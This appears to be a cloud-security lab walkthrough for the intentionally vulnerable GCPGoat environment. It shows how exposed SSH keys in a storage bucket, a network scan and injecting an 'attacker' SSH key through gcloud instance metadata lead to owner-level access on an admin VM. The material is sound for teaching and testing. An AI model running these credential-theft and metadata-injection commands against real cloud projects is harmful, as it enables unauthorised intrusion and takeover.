In this Part 02 of the lab, we will use the credentials of a low-privileged virtual machine (VM) that we found in the dev bucket. We'll use these credentials to pivot and access higher-privileged compute instances via the low-privileged machine.


### Phase 1: Reconnaissance and Initial Access

#### 1. Explore the Compromised Development Bucket

First, list the contents of the development bucket that was compromised in the previous lab:

  

```bash

gsutil ls -r gs://<DEV_BUCKET_NAME>/

```

![Development bucket contents showing config.txt file](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-02.png)


Note the interesting file **config.txt** in the `.ssh` directory. This could contain sensitive information.


#### 2. Retrieve and Analyze Configuration Files

Access the config.txt file from the bucket:

```bash

gsutil cat gs://<DEV_BUCKET_NAME>/shared/files/.ssh/config.txt

# OR via direct HTTPS access

curl https://storage.googleapis.com/<DEV_BUCKET_NAME>/shared/files/.ssh/config.txt

```

![Config file showing IP addresses and user information](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-03.png)

The file contains multiple IP addresses, usernames, and paths to SSH keys.

#### 3. Identify Active Hosts

Scan the IP addresses found in the config file to determine which hosts are accessible:

```bash

nmap <IP_ADDRESS> -Pn

```

![Nmap scan results showing open port 22](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-04.png)

One of the IP addresses will have port 22 (SSH) open. From the config file, we can identify this as the instance associated with user **justin**.


#### 4. Retrieve SSH Key

Download the SSH private key for justin:

```bash

wget https://storage.googleapis.com/<DEV_BUCKET_NAME>/shared/files/.ssh/keys/justin.pem

chmod 400 justin.pem  # Set appropriate permissions

```

![Downloaded SSH key with proper permissions](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-06.png)

### Phase 2: Initial VM Access and Reconnaissance

#### 5. Connect to the Low-Privileged VM

Use the SSH key to access the VM:

```bash

ssh -i justin.pem justin@<IP_ADDRESS>

```

![Successful SSH connection to the VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-07.png)

#### 6. Gather Project Information

Check the VM's service account and project information: 

```bash

gcloud config list

``` 

![gcloud config showing project and account information](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-08.png)


This VM is using the default compute service account, which typically has **Editor** level access but might be restricted by access scopes.

#### 7. Check Service Account Access Scopes

Examine the access scopes applied to the VM:

```bash

curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \

    -H 'Metadata-Flavor:Google'

```
 

![Service account scopes showing compute and storage access](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-09.png)

The VM has full access to compute services and read access to storage buckets.
 

### Phase 3: Discovery of High-Value Targets  

#### 8. Enumerate Compute Instances

List all compute instances in the project:
 

```bash

gcloud compute instances list

```
  

![List of compute instances showing admin-vm](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-10.png)  

We've identified another VM named **admin-vm**. Note the public IP address for this instance. 

### Phase 4: Privilege Escalation via Metadata Modification 

#### 9. Generate New SSH Key Pair

Create a new SSH key for accessing the admin VM:
 

```bash

ssh-keygen -t rsa -C "attacker" -f ./key -P ""

```
 

![SSH key generation output](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-11.png)

This creates a public key (key.pub) and private key (key) for a user named "attacker".

#### 10. Prepare Metadata Update File


Create a metadata file with the new SSH key:
 

```bash

NEWKEY="$(cat ./key.pub)"

echo "attacker:$NEWKEY" > ./meta.txt

cat ./meta.txt  # Verify the contents

```


![Content of meta.txt file showing SSH key](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-12.png)


#### 11. Update the Admin VM's Metadata


Add the SSH key to the admin VM's metadata:  

```bash

gcloud compute instances add-metadata admin-vm --metadata-from-file ssh-keys=meta.txt

```  

![Adding metadata to the admin VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-13.png) 

If prompted, confirm the zone selection. 

#### 12. Verify Metadata Update

Confirm the metadata was successfully updated:
 

```bash

gcloud compute instances describe admin-vm --zone us-west1-c

```

![Instance description showing updated SSH keys](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-14.png)
 

The SSH key for user "attacker" should now be visible in the metadata.
 

### Phase 5: Accessing the High-Privileged VM  

#### 13. Connect to the Admin VM 

Use the newly created SSH key to access the admin VM:
 

```bash

ssh -i ./key attacker@<ADMIN_VM_IP>

```  

![Successfully connected to admin VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-16.png)

You now have access to the admin VM. By default, users added through instance metadata have sudo privileges.  

#### 14. Examine Service Account Privileges 

Check the project and service account information:

```bash

gcloud config list

```

![Admin VM service account information](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-17.png)

The admin VM is using a service account named **admin-service-account**.

#### 15. Examine IAM Policies

Check the permissions assigned to this service account:

```bash

gcloud projects get-iam-policy <PROJECT_ID>

```


![IAM policy showing owner role](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-18.png)

The admin service account has the **owner** role on the project, which grants full administrative access.

#### 16. Verify API Access Scopes
 

Check the access scopes for the admin VM:

```bash

curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes \

    -H 'Metadata-Flavor:Google'

```

![Scopes showing cloud-platform access](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-19.png)


The VM has the **cloud-platform** scope, which provides full API access to all Google Cloud services.

### Alternative Method for Admin VM Access

#### 17. Direct SSH from Developer VM

You can also use the gcloud command to directly SSH to the admin VM:


```bash

gcloud compute ssh admin-vm

```

![Direct SSH access to admin VM](GCPGoat%20Screenshots/GCPGoat-Lab03/GCPGoat-Lab03-20.png)
